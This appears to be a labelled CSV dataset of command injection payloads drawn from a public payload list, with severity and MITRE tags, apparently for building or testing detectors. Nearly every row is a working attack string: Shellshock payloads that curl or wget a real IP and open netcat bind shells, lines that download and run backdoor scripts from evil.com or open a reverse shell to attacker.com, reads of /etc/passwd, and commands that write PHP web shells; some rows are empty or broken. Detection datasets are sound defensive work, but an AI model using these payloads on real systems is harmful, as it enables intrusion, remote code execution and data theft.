Payload,Signature,AttackType,Severity,MITRE,Label,Description
"() { :;}; /bin/bash -c """"curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (main branch)
"() { :;}; /bin/bash -c """"curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (main branch)
"() { :;}; /bin/bash -c """"curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (main branch)
"() { :;}; /bin/bash -c """"wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (main branch)
"() { :;}; /bin/bash -c """"wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\""",CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (main branch)
"() { :;}; /bin/bash -c """"wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (main branch)
"() { :;}; /bin/bash -c """"wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (main branch)
"() { :;}; /bin/bash -c """"wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (main branch)
"() { :;}; /bin/bash -c """"wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (main branch)
&& whoami,CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (main branch)
",CMDi_Unix,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (main branch)
",CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (main branch)
ping -c 21 127.0.0.1,CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (main branch)
ping -c 21 127.0.0.1,CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (main branch)
curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn,CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (main branch)
whoami\,CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (main branch)
whoami\,CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (main branch)
ping 127.0.0.1,CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (main branch)
type C:\boot.ini,CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (main branch)
wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn,CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (main branch)
whoami,CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (main branch)
",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (main branch)
",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (main branch)
",CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (main branch)
",CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (main branch)
&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
/index.html|id|,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
;id;,CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
| powershell -enc BASE64_ENCODED_COMMAND,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
;netstat -a;,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
;id;,CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
| powershell -enc BASE64_ENCODED_COMMAND,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
|/usr/bin/id,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
|id|,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
|/usr/bin/id|,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
||/usr/bin/id|,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
|id;,CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
||/usr/bin/id;,CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
;id|,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
;|/usr/bin/id|,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
\n/bin/ls -al\n,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
\n/usr/bin/id\n,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
\nid\n,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
\n/usr/bin/id;,CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
\nid;,CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
\n/usr/bin/id|,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
\nid|,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
;/usr/bin/id\n,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
;id\n,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
|usr/bin/id\n,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
|nid\n,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
`id`,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
`/usr/bin/id`,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
a);id,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
a;id,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
a);id;,CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
a;id;,CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
a);id|,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
a;id|,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
a)|id,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
a|id,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
a)|id;,CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
a|id,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
|/bin/ls -al,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
a);/usr/bin/id,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
a;/usr/bin/id,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
a);/usr/bin/id;,CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
a;/usr/bin/id;,CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
a);/usr/bin/id|,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
a;/usr/bin/id|,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
a)|/usr/bin/id,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
a|/usr/bin/id,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
a)|/usr/bin/id;,CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
a|/usr/bin/id,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
;system('id'),CMDi_Unix,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
;system('/usr/bin/id'),CMDi_Unix,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
%0A/usr/bin/id,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
%0Aid,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
%0A/usr/bin/id%0A,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
%0Aid%0A,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
& ping -i 30 127.0.0.1 &,CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
& ping -n 30 127.0.0.1 &,CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
%0a ping -i 30 127.0.0.1 %0a,CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
`ping 127.0.0.1`,CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
| id,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
& id,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
; id,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
%0a id %0a,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
`id`,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
$;/usr/bin/id,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`""",CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`""",CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`""",CommandInjection_Generic,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=5""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"() { :;}; /bin/bash -c ""sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"() { :;}; /bin/bash -c ""sleep 1 && echo vulnerable 1""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"() { :;}; /bin/bash -c ""sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"() { :;}; /bin/bash -c ""sleep 3 && echo vulnerable 3""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"() { :;}; /bin/bash -c ""sleep 6 && echo vulnerable 6""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`""",CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`""",CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`""",CommandInjection_Generic,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=4""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"<!--#exec cmd=""/usr/bin/id;-->",CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
&& wget http://evil.com/backdoor.sh -O /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
| cat /etc/passwd,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
; ping -c 10 attacker.com,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
&& nc -e /bin/sh attacker.com 4444,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
| powershell -enc BASE64_ENCODED_COMMAND,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
; ping -c 10 attacker.com,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"; echo ""vulnerable"" > /tmp/pwned.txt",CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
| netstat -an,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"; echo ""vulnerable"" > /tmp/pwned.txt",CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
| powershell -enc BASE64_ENCODED_COMMAND,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
; curl http://evil.com/shell.sh | bash,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
%0a%0d,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
%0Aid,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
%0a id %0a,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
%0Aid%0A,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
%0a ping -i 30 127.0.0.1 %0a,CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
%0A/usr/bin/id,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
%0A/usr/bin/id%0A,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
%20{${phpinfo()}},CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
%20{${sleep(20)}},CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
%20{${sleep(3)}},CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
a|id|,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
a;id|,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
a;id;,CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
a;id\n,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12,CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
| powershell -enc BASE64_ENCODED_COMMAND,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
| dir,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
; dir,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
$(`dir`),CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
& dir,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
&&dir,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
&& dir,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
| dir C:\,CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
; dir C:\,CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
& dir C:\,CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
&& dir C:\,CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
dir C:\,CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
| dir C:\Documents and Settings\*,CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
; dir C:\Documents and Settings\*,CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
& dir C:\Documents and Settings\*,CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
&& dir C:\Documents and Settings\*,CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
dir C:\Documents and Settings\*,CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
| dir C:\Users,CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
; dir C:\Users,CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
& dir C:\Users,CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
&& dir C:\Users,CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
dir C:\Users,CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
;echo%20'<script>alert(1)</script>',XSS_Script,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX,XSS_Script,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"| echo ""<?php include($_GET['page'])| ?>"" > rfi.php",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"; echo ""<?php include($_GET['page']); ?>"" > rfi.php",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"& echo ""<?php include($_GET['page']); ?>"" > rfi.php",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"&& echo ""<?php include($_GET['page']); ?>"" > rfi.php",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"echo ""<?php include($_GET['page']); ?>"" > rfi.php",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"| echo ""<?php system('dir $_GET['dir']')| ?>"" > dir.php",CMDi_Unix,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"; echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",CMDi_Unix,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
